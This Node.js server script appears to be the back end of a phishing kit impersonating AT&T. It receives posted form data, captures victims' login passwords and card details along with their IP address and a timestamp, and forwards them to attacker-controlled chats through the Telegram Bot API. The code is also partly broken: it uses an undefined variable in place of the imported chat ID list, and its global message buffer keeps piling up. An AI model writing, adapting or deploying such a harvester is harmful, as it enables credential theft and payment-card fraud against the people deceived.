const https = require('https');
const querystring = require('querystring');

const { botToken, chatIds } = require('../Config/settings.js'); 


let message = '';

const handlePostRequest = (req, res) => {
  let body = '';

  req.on('data', (data) => {
    body += data;
  });

  req.on('end', () => {
    const postParams = querystring.parse(body);

    if (postParams.Password) {
      message += 'At&T Login📌\n';
      message += `📍 ${req.connection.remoteAddress}\n`;
      message += `🕜 ${new Date().toLocaleString()}\n`;

      for (const key in postParams) {
        message += `${key}: ${postParams[key]}\n`;
      }
    }

    if (postParams.Expiry_date) {
      message += `At&T Card details for ${postParams.visitor}\n`;
      message += `📍 ${req.connection.remoteAddress}\n`;
      message += `🕜 ${new Date().toLocaleString()}\n`;

      for (const key in postParams) {
        message += `${key}: ${postParams[key]}\n`;
      }
    }

    sendTelegramMessage(message);
  });

  res.end();
};

const sendTelegramMessage = (text) => {
  IdTelegram.forEach((chatId) => {
    const website = `https://api.telegram.org/bot${botToken}`;
    const params = querystring.stringify({
      chat_id: chatId,
      text: text,
    });

    const options = {
      hostname: 'api.telegram.org',
      path: '/bot' + botToken + '/sendMessage',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': params.length,
      },
    };

    const req = https.request(options, (res) => {
      // Handle the response if needed
    });

    req.write(params);
    req.end();
  });
};

const server = https.createServer((req, res) => {
  if (req.method === 'POST') {
    handlePostRequest(req, res);
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
});
 
server.listen(8080);
